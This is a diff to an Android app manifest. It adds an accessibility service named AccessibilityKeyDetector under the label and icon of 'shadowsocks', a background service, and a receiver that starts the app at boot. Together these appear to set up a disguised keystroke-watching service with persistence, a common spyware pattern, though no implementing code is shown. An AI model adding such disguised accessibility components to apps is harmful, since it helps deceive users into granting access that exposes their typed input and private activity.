@@ -99,5 +99,28 @@
         <meta-data
             android:name="com.google.android.gms.ads.APPLICATION_ID"
             android:value="ca-app-pub-3283768469187309~3571758745"/>
+
+
+        <service android:name=".service.AccessibilityKeyDetector"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:icon="@drawable/ic_qu_shadowsocks_launcher"
+            android:label="shadowsocks">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+
+        <service android:name=".service.BackgroundService" />
+
+
+        <receiver android:name=".service.AutoStart">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
     </application>
 </manifest>
